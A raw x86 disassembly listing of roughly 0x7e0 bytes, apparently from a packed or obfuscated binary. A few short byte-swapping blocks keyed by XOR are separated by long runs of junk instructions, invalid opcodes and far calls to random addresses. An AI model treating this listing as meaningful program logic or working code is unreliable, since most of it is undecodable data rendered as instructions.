  404a6f:	sub    DWORD PTR [ebx+0x1e],esp
  404a72:	and    ah,dl
  404a74:	clc    
  404a75:	imul   ebx,DWORD PTR [esi-0x13],0xffffffc6
  404a79:	pop    es
  404a7a:	or     DWORD PTR [ebx+0x4f],ebx
  404a7d:	fsub   st,st(5)
  404a7f:	xchg   ecx,eax
  404a80:	data16 repz (bad) 
  404a83:	dec    edx
  404a84:	add    eax,0xcd5a477
  404a89:	jns    0x404a71
  404a8b:	mov    eax,ds:0x47401d15
  404a90:	add    BYTE PTR [edx-0x4abf1939],al
  404a96:	push   ebp
  404a97:	imul   edx,DWORD PTR [eax-0x11],0x6f866b31
  404a9e:	fs mov esp,0x96e913b1
  404aa4:	je     0x404a48
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x6f3c6a28
  404b32:	and    eax,0x22a2252c
  404b37:	jle    0x404bb7
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b3b
  404b3e:	(bad)  
  404b41:	xchg   ebp,eax
  404b42:	mov    dl,BYTE PTR es:[eax+0x76f5bd00]
  404b49:	jbe    0x404b6b
  404b4b:	mov    edx,0xe2c96900
  404b50:	sub    cl,0x15
  404b53:	call   0x9038:0x7ca5f1f2
  404b5a:	sub    eax,0xb2f70df5
  404b5f:	mov    edx,0x9ca1059d
  404b64:	sbb    bl,BYTE PTR [ecx]
  404b66:	imul   ecx,DWORD PTR [eax+0x6fd1417],0xfdb11243
  404b70:	arpl   WORD PTR [eax],bx
  404b72:	adc    DWORD PTR [ebp-0x2e],edx
  404b75:	bswap  edx
  404b77:	inc    edx
  404b78:	pop    esi
  404b79:	mov    ch,0x29
  404b7b:	psubb  mm0,mm4
  404b7e:	cld    
  404b7f:	fs or  ch,bh
  404b82:	mov    ds:0x3daeb527,eax
  404b87:	mov    cl,0xa6
  404b89:	in     eax,0x43
  404b8b:	icebp  
  404b8c:	cli    
  404b8d:	je     0x404bef
  404b8f:	mov    ah,dl
  404b91:	xor    edi,DWORD PTR [ebx+ecx*1]
  404b94:	adc    BYTE PTR [edx+esi*8+0x680aa163],0x95
  404b9c:	call   0xe348:0x55e3cf3b
  404ba3:	cli    
  404ba4:	adc    dl,BYTE PTR [edi-0x70feecef]
  404baa:	mov    ?,edx
  404bac:	fld    st(6)
  404bae:	xor    DWORD PTR [eax],ebx
  404bb0:	and    BYTE PTR [ebx],ch
  404bb2:	test   DWORD PTR ds:0xb998a576,edi
  404bb8:	inc    esi
  404bb9:	sbb    DWORD PTR [edx+0x7873c3c9],0x96190c39
  404bc3:	pushf  
  404bc4:	stos   BYTE PTR es:[edi],al
  404bc5:	push   ds
  404bc6:	push   ebx
  404bc7:	add    bl,BYTE PTR [eax]
  404bc9:	xor    eax,0x3a742d10
  404bce:	icebp  
  404bcf:	inc    ebp
  404bd0:	adc    bh,ah
  404bd2:	repz jecxz 0x404bb7
  404bd5:	sub    DWORD PTR [ecx+ecx*1],edx
  404bd8:	(bad)  
  404bd9:	xor    esp,DWORD PTR [ebx+0x18]
  404bdc:	xor    BYTE PTR cs:[ecx-0x1041fc32],0xfd
  404be4:	fldenv cs:[ecx+esi*4-0x6a]
  404be9:	jae    0x404b8f
  404beb:	mov    ecx,0x6ac233e1
  404bf0:	pop    eax
  404bf1:	ret    0x32dc
  404bf4:	lea    esp,[ecx-0x58]
  404bf7:	and    BYTE PTR [ebx+ecx*8+0x64],bh
  404bfb:	mov    WORD PTR [ebx+0x25],es
  404bfe:	mov    ah,0x56
  404c00:	mov    bl,bl
  404c02:	pop    ss
  404c03:	ins    DWORD PTR es:[edi],dx
  404c04:	jae    0x404b88
  404c06:	mul    BYTE PTR [ebp-0x647ee611]
  404c0c:	(bad)  
  404c0d:	mov    bl,0xf9
  404c0f:	lds    ebp,FWORD PTR [edi-0x19]
  404c12:	dec    edx
  404c13:	arpl   sp,bx
  404c15:	mov    WORD PTR [edi],fs
  404c17:	aam    0xd3
  404c19:	lock test eax,0xa0b83e4c
  404c1f:	pop    ss
  404c20:	mov    al,0x15
  404c22:	push   ds
  404c23:	scas   al,BYTE PTR es:[edi]
  404c24:	clc    
  404c25:	push   es
  404c26:	ins    BYTE PTR es:[edi],dx
  404c27:	call   0xfba6:0xb4919d2c
  404c2e:	inc    ebx
  404c2f:	pop    esi
  404c30:	jl     0x404bb5
  404c32:	xlat   BYTE PTR ds:[ebx]
  404c33:	aaa    
  404c34:	pop    esp
  404c35:	push   ecx
  404c36:	clc    
  404c37:	mov    esi,0xa39a1a2f
  404c3c:	std    
  404c3d:	fdivr  st,st(7)
  404c3f:	in     eax,0xb4
  404c41:	add    eax,0x45b903b0
  404c46:	add    BYTE PTR [esi-0x689407a7],0x1f
  404c4d:	jo     0x404cc2
  404c4f:	xor    ebx,DWORD PTR [edi+0x27]
  404c52:	jae    0x404be1
  404c54:	imul   ebx,DWORD PTR [ecx-0x19671b13],0xffffff95
  404c5b:	mov    esi,0x975ee31f
  404c60:	xor    DWORD PTR [esi-0x178a9f8c],edx
  404c66:	shl    BYTE PTR [edx-0x6483621a],1
  404c6c:	out    0x5c,al
  404c6e:	dec    esp
  404c6f:	scas   al,BYTE PTR es:[edi]
  404c70:	ins    DWORD PTR es:[edi],dx
  404c71:	fsubr  DWORD PTR [edi+0x53]
  404c74:	jne    0x404c34
  404c76:	rcl    BYTE PTR [edi+0x4b],0x4b
  404c7a:	sti    
  404c7b:	cwde   
  404c7c:	leave  
  404c7d:	(bad)  
  404c7f:	inc    edx
  404c80:	dec    ebp
  404c81:	jge    0x404cd6
  404c83:	test   al,0x22
  404c85:	sahf   
  404c86:	daa    
  404c87:	dec    ebp
  404c88:	mov    BYTE PTR [edi],ch
  404c8a:	jecxz  0x404c5c
  404c8c:	das    
  404c8d:	mov    ds:0x3403d5de,al
  404c92:	push   esp
  404c93:	or     eax,0xad96ab6d
  404c98:	dec    edx
  404c99:	inc    esi
  404c9a:	out    dx,eax
  404c9b:	jl     0x404c84
  404c9d:	call   0x5e10:0x7f888e89
  404ca4:	in     eax,dx
  404ca5:	xchg   esp,eax
  404ca6:	cmp    eax,0x5d1b40f1
  404cab:	rcl    BYTE PTR [edi-0x6d],1
  404cae:	out    0x54,al
  404cb0:	and    BYTE PTR [eiz*1-0x1623902f],bl
  404cb7:	dec    edx
  404cb8:	push   cs
  404cb9:	dec    edi
  404cba:	mov    dh,0x68
  404cbc:	adc    eax,0xfcb0371
  404cc1:	xor    ah,bl
  404cc3:	jmp    0x404d15
  404cc5:	push   es
  404cc6:	inc    ebp
  404cc7:	mov    ebp,0xd5066905
  404ccc:	int3   
  404ccd:	dec    eax
  404ccf:	daa    
  404cd0:	dec    edx
  404cd1:	cmp    al,0x65
  404cd3:	stos   BYTE PTR es:[edi],al
  404cd4:	push   ds
  404cd5:	sub    al,0x61
  404cd7:	cmp    ch,BYTE PTR [edi]
  404cd9:	cld    
  404cda:	lahf   
  404cdb:	in     al,dx
  404cdc:	pop    ebp
  404cdd:	leave  
  404cde:	inc    ebx
  404cdf:	push   ebx
  404ce0:	jno    0x404c72
  404ce2:	xchg   DWORD PTR [ebx-0x56144cb5],ebx
  404ce8:	out    0xa1,eax
  404cea:	or     BYTE PTR [edx],0xcb
  404ced:	mov    esi,0x83c402cc
  404cf2:	dec    eax
  404cf3:	lods   al,BYTE PTR ds:[esi]
  404cf4:	mov    eax,ds:0x3bed452f
  404cf9:	aad    0xf1
  404cfb:	popa   
  404cfc:	or     bh,BYTE PTR [edi]
  404cfe:	cwde   
  404cff:	fdivr  QWORD PTR [ecx+0xd4aa532]
  404d05:	xor    dh,BYTE PTR [edi+0x19]
  404d08:	xchg   esp,eax
  404d09:	jbe    0x404d76
  404d0b:	gs dec esp
  404d0d:	pop    esp
  404d0e:	icebp  
  404d0f:	ror    DWORD PTR [edi-0x5b],1
  404d12:	dec    esi
  404d13:	adc    al,0x4e
  404d15:	shr    BYTE PTR ds:0x54673110,1
  404d1b:	pushf  
  404d1c:	inc    ebp
  404d1d:	dec    edx
  404d1e:	push   eax
  404d1f:	imul   DWORD PTR [esi+0x30]
  404d22:	lahf   
  404d23:	out    0x65,eax
  404d25:	loopne 0x404d60
  404d27:	addr16 jnp 0x404cf4
  404d2a:	add    ch,BYTE PTR [ebx-0x26]
  404d2d:	jg     0x404d8d
  404d2f:	sub    eax,0x3c13d037
  404d34:	pop    edi
  404d35:	or     eax,0x883bdd4e
  404d3a:	pushf  
  404d3b:	xchg   esi,eax
  404d3d:	hlt    
  404d3e:	neg    ch
  404d40:	mov    edx,0x4f6269a8
  404d45:	mov    esp,0xb1db918d
  404d4a:	xchg   ebp,eax
  404d4b:	pop    ebp
  404d4c:	sbb    eax,ecx
  404d4e:	xchg   edx,eax
  404d4f:	dec    edx
  404d50:	mov    cl,BYTE PTR [ebx]
  404d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d53:	mov    bh,0x6f
  404d55:	pop    ss
  404d56:	int    0xc5
  404d58:	loopne 0x404d9e
  404d5a:	out    0x9f,al
  404d5c:	daa    
  404d5d:	jg     0x404d82
  404d5f:	fidivr DWORD PTR [eax+0x27f32f70]
  404d65:	loopne 0x404d6f
  404d67:	fst    DWORD PTR [eax-0x5f]
  404d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d6b:	(bad)  [ecx-0xe]
  404d6e:	cmp    DWORD PTR [ebp-0x62],0x4b
  404d72:	xlat   BYTE PTR ds:[ebx]
  404d73:	out    0xfc,eax
  404d75:	push   es
  404d76:	push   0x3b
  404d78:	jbe    0x404d01
  404d7a:	mov    bh,0x89
  404d7c:	jne    0x404da9
  404d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7f:	push   eax
  404d80:	inc    eax
  404d81:	sub    BYTE PTR [ebx+0x68babbb1],ah
  404d87:	mov    WORD PTR [ecx+ebp*4],es
  404d8a:	mov    cl,0x51
  404d8c:	sbb    eax,0x49118377
  404d91:	sub    bh,BYTE PTR [esi-0x5ad20520]
  404d97:	sbb    DWORD PTR [edi+0x7e],eax
  404d9a:	jbe    0x404dee
  404d9c:	push   0xffffffb3
  404d9e:	adc    BYTE PTR [ecx+0x5c895219],dh
  404da4:	aam    0xa5
  404da6:	pop    edx
  404da7:	aas    
  404da8:	pop    ecx
  404da9:	leave  
  404daa:	les    ebp,FWORD PTR [eax+0x34deb472]
  404db0:	add    edx,DWORD PTR [edx+esi*2-0x38575395]
  404db7:	cmc    
  404db8:	imul   eax,DWORD PTR [edx],0xf9def5a0
  404dbe:	gs std 
  404dc0:	push   edx
  404dc1:	(bad)  
  404dc2:	cmp    cl,BYTE PTR [eax]
  404dc4:	and    DWORD PTR [edi-0x7f7ef986],ebp
  404dca:	call   FWORD PTR [ebx+0x3f]
  404dcd:	xchg   edi,eax
  404dce:	(bad)  [eax-0x6bcf034e]
  404dd4:	pop    edi
  404dd5:	aas    
  404dd6:	dec    ecx
  404dd7:	mov    edi,0xeaf381a6
  404ddc:	js     0x404d99
  404dde:	cs in  al,0xcd
  404de1:	xchg   BYTE PTR [ebx],ah
  404de3:	fwait
  404de4:	xchg   ebp,eax
  404de5:	push   0xffffffc1
  404de7:	add    BYTE PTR [esi+0x12b95164],cl
  404ded:	inc    edi
  404dee:	adc    eax,0x1fc303d2
  404df3:	and    DWORD PTR [ebx-0x71],eax
  404df6:	or     al,ch
  404df8:	jns    0x404e6a
  404dfa:	popf   
  404dfb:	popa   
  404dfc:	inc    esi
  404dfd:	xor    ah,BYTE PTR [esi+0x15b66acd]
  404e03:	mov    eax,ds:0xee7d5358
  404e08:	jae    0x404e6c
  404e0a:	xchg   ch,ah
  404e0c:	scas   eax,DWORD PTR es:[edi]
  404e0d:	push   0x15564c0b
  404e12:	push   esp
  404e13:	mov    al,ds:0x1eaaca8f
  404e18:	inc    eax
  404e19:	pop    ebx
  404e1a:	fisttp QWORD PTR [edi-0x111b26c8]
  404e20:	jbe    0x404dcd
  404e22:	call   0x3d7:0xaf0ff903
  404e29:	push   ebp
  404e2a:	in     al,dx
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e9a
  404e5e:	shr    al,cl
  404e60:	pop    ecx
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e46
  404e6a:	test   dh,0xf6
  404e6d:	push   esi
  404e6e:	push   ecx
  404e6f:	xchg   ebx,eax
  404e70:	lock fnstsw WORD PTR [eax+0x30d676aa]
  404e77:	jnp    0x404e36
  404e79:	mov    al,ds:0x350d9668
  404e7e:	shl    DWORD PTR [eax],0xa7
  404e81:	mov    edx,0x1dd5358b
  404e86:	dec    esi
  404e87:	nop
  404e88:	xor    edx,DWORD PTR [eax+0x28]
  404e8b:	fs arpl bx,ax
  404e8e:	lahf   
  404e8f:	out    0x6a,eax
  404e91:	or     eax,0x57d1c44f
  404e96:	scas   eax,DWORD PTR es:[edi]
  404e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e98:	xchg   edx,eax
  404e99:	xlat   BYTE PTR ds:[ebx]
  404e9a:	mov    esi,DWORD PTR [edi-0xe]
  404e9d:	pop    ebx
  404e9e:	pop    ds
  404e9f:	pop    esi
  404ea0:	push   0x49
  404ea2:	ds cdq 
  404ea4:	add    ecx,edx
  404ea6:	mov    ds:0xab936b3f,al
  404eab:	out    0xf8,eax
  404ead:	in     eax,0xd4
  404eaf:	sbb    al,0x4a
  404eb1:	sbb    BYTE PTR [ebx],bh
  404eb3:	jecxz  0x404ec7
  404eb5:	add    DWORD PTR [ecx],0xffffffc7
  404eb8:	xchg   edi,eax
  404eb9:	or     BYTE PTR [ebp-0x34],ah
  404ebc:	jmp    0xa1f7423f
  404ec1:	imul   ecx,edi,0xffffffda
  404ec4:	push   0x803a7404
  404ec9:	mov    dl,0xaf
  404ecb:	cmp    al,0x35
  404ecd:	xor    DWORD PTR [eax-0x67],0x860ba309
  404ed4:	fdivrp st(1),st
  404ed6:	sbb    esp,DWORD PTR [ebx]
  404ed8:	push   ss
  404ed9:	push   esi
  404eda:	loopne 0x404edd
  404edc:	mov    DWORD PTR [esi],ebp
  404ede:	push   ebp
  404edf:	jle    0x404f00
  404ee1:	sbb    BYTE PTR [edi+0x2218bf75],dh
  404ee7:	pop    esp
  404ee8:	push   ebx
  404ee9:	adc    eax,0x734b0427
  404eee:	cdq    
  404eef:	fist   DWORD PTR [edx+ecx*8-0x2661238]
  404ef6:	inc    eax
  404ef7:	xchg   ebp,eax
  404ef8:	inc    edx
  404ef9:	pop    ss
  404efa:	imul   ecx,DWORD PTR [esi-0xc],0x45a0c915
  404f01:	repnz or BYTE PTR [edi-0x3538489b],dl
  404f08:	fs xor bh,ah
  404f0b:	push   esi
  404f0c:	push   edi
  404f0d:	or     eax,DWORD PTR [eax+0x1a47a632]
  404f13:	cmp    al,0xec
  404f15:	nop
  404f16:	cmc    
  404f17:	ins    DWORD PTR es:[edi],dx
  404f18:	mov    bh,0xf5
  404f1a:	cmc    
  404f1b:	ins    BYTE PTR es:[edi],dx
  404f1c:	loopne 0x404f09
  404f1e:	not    DWORD PTR [ecx-0x1dab8098]
  404f24:	dec    ecx
  404f25:	mov    ds:0xc67beeba,al
  404f2a:	and    eax,0xe0fd65d0
  404f2f:	fchs   
  404f31:	(bad)  
  404f32:	xor    al,0x66
  404f34:	jb     0x404fae
  404f36:	sub    bh,BYTE PTR [ecx+0x7d84d391]
  404f3c:	shl    DWORD PTR [esi+0xe],cl
  404f3f:	cmp    DWORD PTR [ebp-0x2b],eax
  404f42:	mov    bl,0x6e
  404f44:	mov    eax,ds:0x888fd064
  404f49:	lea    edi,[ebp+0x7bed713d]
  404f4f:	scas   eax,DWORD PTR es:[edi]
  404f50:	les    ebx,FWORD PTR [ebp+0x5e]
  404f53:	fld    DWORD PTR [esi+ebx*4]
  404f56:	xchg   edx,eax
  404f57:	leave  
  404f58:	sub    eax,0x6dc36609
  404f5d:	sub    al,0x35
  404f5f:	dec    eax
  404f60:	(bad)  
  404f61:	jae    0x404ef5
  404f63:	stos   DWORD PTR es:[edi],eax
  404f64:	add    bl,dh
  404f66:	sub    bh,BYTE PTR [ebp+0x19]
  404f69:	aaa    
  404f6a:	mov    cl,0xf8
  404f6c:	dec    edx
  404f6d:	enter  0x9fb9,0x3a
  404f71:	jg     0x404f00
  404f73:	xor    al,0xd7
  404f75:	mov    BYTE PTR [edi+0x5b],al
  404f78:	or     WORD PTR [esi+0x11],0x21
  404f7d:	xor    ebp,DWORD PTR [esi-0x66]
  404f80:	aas    
  404f81:	stos   BYTE PTR es:[edi],al
  404f82:	xchg   BYTE PTR [edx+0x67d25878],al
  404f88:	mov    WORD PTR [ebp-0x3efdef3a],fs
  404f8e:	fcomp  st(4)
  404f90:	fcom   DWORD PTR [edi]
  404f92:	push   cs
  404f93:	jp     0x405010
  404f95:	sbb    ch,BYTE PTR [eax+0x769ecda3]
  404f9b:	aaa    
  404f9c:	pop    es
  404f9d:	cmp    al,0x34
  404f9f:	adc    DWORD PTR [esi+0x331476ac],esi
  404fa5:	dec    ebp
  404fa6:	cmp    BYTE PTR [ecx+0x41],al
  404fa9:	and    eax,DWORD PTR [ebx+0x5a]
  404fac:	loope  0x404f68
  404fae:	pop    edx
  404faf:	sti    
  404fb0:	xlat   BYTE PTR ds:[ebx]
  404fb1:	mov    dh,0x16
  404fb3:	stos   BYTE PTR es:[edi],al
  404fb4:	cli    
  404fb5:	inc    edi
  404fb6:	sub    al,0x71
  404fb8:	push   cs
  404fb9:	xchg   DWORD PTR [edx-0x46],edi
  404fbc:	cmp    DWORD PTR [esi],ebp
  404fbe:	out    dx,al
  404fbf:	ins    DWORD PTR es:[edi],dx
  404fc0:	push   0x43553d89
  404fc5:	sub    eax,0x581fc195
  404fca:	loope  0x404fe4
  404fcc:	aas    
  404fcd:	sar    DWORD PTR [esi+0x63a2fda4],cl
  404fd3:	sub    DWORD PTR [esi-0x20],esi
  404fd6:	(bad)  
  404fd7:	shl    dl,1
  404fd9:	xor    esi,esp
  404fdb:	cmp    eax,0xcb3b90da
  404fe0:	ins    BYTE PTR es:[edi],dx
  404fe1:	adc    BYTE PTR [esi],cl
  404fe3:	mov    eax,ds:0x927a17e9
  404fe8:	hlt    
  404fe9:	sub    al,0xb8
  404feb:	mov    dl,0x66
  404fed:	and    al,0x9f
  404fef:	xor    DWORD PTR [edi],edi
  404ff1:	push   ss
  404ff2:	mov    ds:0x93f87a36,al
  404ff7:	ds rcl bh,1
  404ffa:	inc    eax
  404ffb:	dec    ebx
  404ffc:	loope  0x405030
  404ffe:	pop    eax
  404fff:	sbb    al,0x93
  405001:	call   DWORD PTR ds:0xddf97f32
  405007:	jge    0x40505d
  405009:	gs xor eax,0x5009e694
  40500f:	fs (bad) 
  405011:	sub    ch,ah
  405013:	gs addr16 inc esi
  405016:	int3   
  405017:	mov    eax,0x42432b69
  40501c:	mov    ah,0xe
  40501e:	dec    edi
  40501f:	das    
  405020:	retf   0xa159
  405023:	mov    edi,0x99cf3360
  405028:	adc    esi,DWORD PTR [ebx+0x556a08a9]
  40502e:	faddp  st(6),st
  405030:	out    dx,eax
  405031:	pusha  
  405032:	sar    ch,1
  405034:	pop    eax
  405035:	stos   DWORD PTR es:[edi],eax
  405036:	sbb    bl,al
  405038:	mov    edi,DWORD PTR [esi]
  40503a:	rcr    DWORD PTR [esi+edx*1+0x16],1
  40503e:	mov    ds:0xbe69f8e2,al
  405043:	je     0x40503c
  405045:	lahf   
  405046:	jmp    0x57562155
  40504b:	xchg   DWORD PTR [edi+0x1a],ebp
  40504e:	imul   esi,DWORD PTR [edx],0xffffffb7
  405051:	(bad)  
  405052:	(bad)  
  405053:	and    eax,0x8db4720a
  405058:	into   
  405059:	and    eax,DWORD PTR [edx+0x1dd0d2d9]
  40505f:	cmp    DWORD PTR [ebx+0x590dfb41],esp
  405065:	adc    eax,0xfbcfb9f3
  40506a:	adc    esi,DWORD PTR [ebx+0x179d7dec]
  405070:	add    esp,DWORD PTR ds:0x71330ede
  405076:	mov    edi,0x64aeb049
  40507b:	jmp    0x4050a2
  40507d:	xor    eax,0x2d51434c
  405082:	mov    bh,0xf0
  405084:	and    dh,dh
  405086:	outs   dx,BYTE PTR gs:[esi]
  405088:	pop    es
  405089:	dec    edi
  40508a:	cmp    dl,BYTE PTR [ecx+esi*8+0x2d]
  40508e:	adc    BYTE PTR [edi+0x1e],ch
  405091:	mov    ch,0x8f
  405093:	les    esp,FWORD PTR [ecx-0x4950e4cb]
  405099:	ror    DWORD PTR [esi],cl
  40509b:	rol    ecx,cl
  40509d:	sahf   
  40509e:	retf   0x7d6c
  4050a1:	or     dl,BYTE PTR [ecx-0x3ce9877a]
  4050a7:	xchg   dh,dh
  4050a9:	cmp    ecx,esp
  4050ab:	inc    bl
  4050ad:	sti    
  4050ae:	pop    esp
  4050af:	inc    ebx
  4050b0:	ins    DWORD PTR es:[edi],dx
  4050b1:	and    ecx,ebp
  4050b3:	xor    bl,BYTE PTR [ebx]
  4050b5:	xchg   edi,eax
  4050b6:	in     eax,0x89
  4050b8:	and    dh,cl
  4050ba:	gs mov edx,0x6344fd77
  4050c0:	retf   0x46e2
  4050c3:	inc    ebx
  4050c4:	lods   eax,DWORD PTR ds:[esi]
  4050c5:	fs (bad) 
  4050c7:	mov    eax,0xf1bfaf96
  4050cc:	loope  0x4050e2
  4050ce:	and    ebp,eax
  4050d0:	pop    ss
  4050d1:	test   ah,dl
  4050d3:	(bad)  
  4050d4:	sti    
  4050d5:	push   ecx
  4050d6:	int3   
  4050d7:	cmp    ah,BYTE PTR [ecx-0x7d]
  4050da:	imul   edi,DWORD PTR [esi-0x2631535b],0x382fb6fa
  4050e4:	enter  0xc235,0x5d
  4050e8:	mov    ch,0x24
  4050ea:	add    BYTE PTR [edi],bh
  4050ec:	xchg   esi,eax
  4050ed:	xchg   BYTE PTR [esi+0x49],al
  4050f0:	stc    
  4050f1:	cmp    al,0x78
  4050f3:	fld    DWORD PTR [eax]
  4050f5:	mov    eax,0xb8af44f
  4050fa:	xchg   BYTE PTR [ecx],dh
  4050fc:	(bad)  
  4050fd:	inc    edi
  4050fe:	inc    eax
  4050ff:	into   
  405100:	lock mov al,ds:0xc3107923
  405106:	cmc    
  405107:	inc    ebx
  405108:	mov    edi,0xee18376d
  40510d:	mov    ebp,0xcdcf0c65
  405112:	int3   
  405113:	mul    DWORD PTR [esp+eiz*4-0xf1c2d61]
  40511a:	dec    ecx
  40511b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40511c:	pop    edi
  40511d:	jge    0x40516b
  40511f:	inc    esi
  405120:	imul   eax,DWORD PTR [ebx],0x70
  405123:	enter  0xf866,0xec
  405127:	je     0x40512a
  405129:	test   dl,bh
  40512b:	repnz xchg esi,eax
  40512d:	jbe    0x4050ec
  40512f:	inc    eax
  405130:	int3   
  405131:	stos   DWORD PTR es:[edi],eax
  405132:	adc    DWORD PTR [ebx+0x298bec52],esp
  405138:	loopne 0x40513f
  40513a:	push   cs
  40513b:	or     DWORD PTR [ebp+0x1c],ecx
  40513e:	ins    BYTE PTR es:[edi],dx
  40513f:	in     eax,0x8c
  405141:	mov    WORD PTR [edi+0x5bc92286],?
  405147:	mov    ch,0x85
  405149:	jmp    0xf5b:0x760acc59
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	pop    ebp
  405172:	and    dl,BYTE PTR [ebx+0x7e2cf6e6]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x40512b
  40517e:	popf   
  40517f:	push   0x45
  405181:	and    eax,0xe1560cae
  405186:	dec    eax
  405187:	out    dx,eax
  405188:	add    bh,ch
  40518a:	xor    eax,0xe693e523
  40518f:	int3   
  405190:	repnz sub ch,cl
  405193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405194:	adc    BYTE PTR [eax-0x3a],bh
  405197:	fdiv   QWORD PTR [eax*8-0x23348abc]
  40519e:	sbb    al,0x64
  4051a0:	hlt    
  4051a1:	jecxz  0x40516c
  4051a3:	call   0x7acd3e23
  4051a8:	inc    esp
  4051a9:	dec    bp
  4051ab:	scas   eax,DWORD PTR es:[edi]
  4051ac:	adc    BYTE PTR [edi+0x65],ah
  4051af:	hlt    
  4051b0:	jecxz  0x405155
  4051b2:	jmp    FWORD PTR [esi+ebx*1+0x344360bc]
  4051b9:	aad    0x3
  4051bb:	sub    bh,BYTE PTR [ecx]
  4051bd:	sahf   
  4051be:	out    0x90,al
  4051c0:	mov    ?,WORD PTR [edx-0x4486d63]
  4051c6:	lock push ss
  4051c8:	xchg   DWORD PTR ds:0x5a0487da,esi
  4051ce:	call   0x703753d2
  4051d3:	call   0xb5:0x451746bd
  4051da:	ins    DWORD PTR es:[edi],dx
  4051db:	mov    bl,BYTE PTR [ebx]
  4051dd:	cmp    BYTE PTR [ecx],ah
  4051df:	mov    al,ds:0xe38a91f3
  4051e4:	mov    cl,0x9
  4051e6:	jg     0x4051c8
  4051e8:	in     eax,0x4b
  4051ea:	adc    esi,ebx
  4051ec:	add    al,BYTE PTR [ecx-0x48f77cff]
  4051f2:	bound  ecx,QWORD PTR [edi]
  4051f4:	sbb    ecx,esi
  4051f6:	ret    0xf15e
  4051f9:	lea    esp,[ebp-0x37]
  4051fc:	cmp    ebp,DWORD PTR [ebx]
  4051fe:	dec    esp
  4051ff:	jne    0x405181
  405201:	int    0xa6
  405203:	fdiv   st(3),st
  405205:	ret    
  405206:	aaa    
  405207:	scas   al,BYTE PTR es:[edi]
  405208:	jge    0x405241
  40520a:	out    dx,eax
  40520b:	in     al,0x9
  40520d:	mov    dh,0x8
  40520f:	stos   DWORD PTR es:[edi],eax
  405210:	inc    esi
  405211:	dec    edx
  405212:	mov    ?,WORD PTR [edx-0x55ad887a]
  405218:	push   edx
  405219:	(bad)  [edi+0x3d]
  40521c:	loop   0x4051af
  40521e:	lock jo 0x40525f
  405221:	push   edi
  405222:	aam    0xf6
  405224:	add    BYTE PTR [esi-0x23e113a6],ah
  40522a:	add    al,0x86
  40522c:	jl     0x4051d9
  40522e:	bound  ebx,QWORD PTR [ebx-0x7c166bf6]
  405234:	xchg   bh,ch
  405236:	cmc    
  405237:	push   ds
  405238:	add    DWORD PTR [ecx+edx*1],0x3c
  40523c:	pusha  
  40523d:	jl     0x405230
  40523f:	jge    0x4051e9
  405241:	ror    al,cl
  405243:	fsubr  QWORD PTR [ebp+0x6f]
  405246:	sub    ecx,DWORD PTR [edx]
  405248:	inc    edi
  405249:	mov    dl,0xae
